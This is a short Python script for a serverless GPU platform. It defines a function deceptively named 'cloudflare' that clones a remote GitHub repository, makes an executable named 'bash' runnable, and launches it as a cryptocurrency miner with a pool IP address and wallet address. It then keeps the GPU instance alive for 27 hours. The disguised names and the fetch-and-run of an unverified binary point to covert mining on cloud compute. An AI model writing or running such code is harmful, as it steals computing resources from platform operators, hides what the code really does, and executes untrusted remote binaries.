from beam import function, Image
import subprocess
import time

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
    ])
)


@function(
    name="cloudflare",
    image=image,
    gpu="RTX4090",
    cpu=8,
    memory="24Gi",
    timeout=27 * 60 * 60,
)
def run_script():

    print("=== CHECK GPU ===")
    subprocess.run(
        ["nvidia-smi"],
        check=False,
    )

    cmd = """
    set -e

    echo "=== CURRENT DIRECTORY ==="
    pwd

    echo "=== CLONE VB ==="
    cd /mnt/code
    rm -rf vb
    git clone https://github.com/malogrono/vb.git

    echo "=== CHECK VB ==="
    ls -lah /mnt/code/vb

    echo "=== CHECK BASH ==="
    ls -lh /mnt/code/vb/bash

    echo "=== SET PERMISSION ==="
    chmod u+x /mnt/code/vb/bash

    echo "=== SELESAI ==="
    cd /mnt/code/vb
    pwd
    ls -lah
    
    echo "=== RUN PROC DIRECT ==="
    ./bash --disable-cpu --algorithm pearlhash --pool 95.111.195.159:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.rtx
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 27 hours...")
    time.sleep(60 * 60 * 27)
